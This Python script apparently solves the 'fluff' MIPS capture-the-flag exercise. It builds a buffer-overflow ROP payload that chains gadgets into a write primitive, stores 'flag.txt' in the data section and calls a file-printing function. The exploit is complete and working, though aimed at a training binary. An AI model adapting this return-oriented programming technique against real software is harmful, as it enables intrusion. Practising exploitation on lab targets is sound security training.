#!/usr/bin/python3

"""Exploit for fluff MIPS."""

import argparse
import pathlib
import struct
import sys


# zero out $s1
ZERO_OUT_S1 = 0x400930

# load writable addr or string into $s2
LOAD_S2 = 0x40094c

# move $s2 into $s1
S2_INTO_S1 = 0x400964

# move $s1 into $s0
S1_INTO_S0 = 0x40097c

# execute the write
WRITE_IT = 0x40099c

# load a0, ret to system
PRINT_FILE_GADGET = 0x4009ac
PRINT_FILE = 0x400af0

# sections in the file
DATA_SECTION = 0x411550


def build_write4_gadget(address, data):
    """Build a gadget for a write4 primitive."""
    if len(data) > 4:
        raise ValueError('Length of data to write is greater than 4')

    # load data section address into $s0
    buf = struct.pack('<I', ZERO_OUT_S1)
    buf += b'B' * 4
    buf += b'C' * 4
    buf += struct.pack('<I', LOAD_S2)
    buf += b'D' * 4
    buf += struct.pack('<I', address)
    buf += struct.pack('<I', S2_INTO_S1)
    buf += b'E' * 4
    buf += struct.pack('<I', S1_INTO_S0)

    # load string into $s1
    buf += b'F' * 4
    buf += struct.pack('<I', ZERO_OUT_S1)
    buf += b'G' * 4
    buf += b'H' * 4
    buf += struct.pack('<I', LOAD_S2)
    buf += b'I' * 4
    buf += data
    buf += struct.pack('<I', S2_INTO_S1)

    # write $s1 into 0($s0)
    buf += b'J' * 4
    buf += struct.pack('<I', WRITE_IT)
    buf += b'K' * 4

    return buf


def main(argv=sys.argv):
    """main."""
    parser = argparse.ArgumentParser(
        description='Exploit for fluff MIPS'
    )

    parser.add_argument(
        'payload_file',
        type=pathlib.Path,
        default=pathlib.Path('payload.bin'),
        nargs='?',
        help='Path to write payload file to'
    )

    args = parser.parse_args()

    buf = b'A' * 36

    buf += build_write4_gadget(DATA_SECTION, b'flag')
    buf += build_write4_gadget(DATA_SECTION + 4, b'.txt')
    buf += build_write4_gadget(DATA_SECTION + 8, b'\x00' * 4)

    buf += struct.pack('<I', PRINT_FILE_GADGET)
    buf += b'L' * 4
    buf += struct.pack('<I', PRINT_FILE)
    buf += struct.pack('<I', DATA_SECTION)

    with args.payload_file.open(mode='wb') as fobj:
        fobj.write(buf)

    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
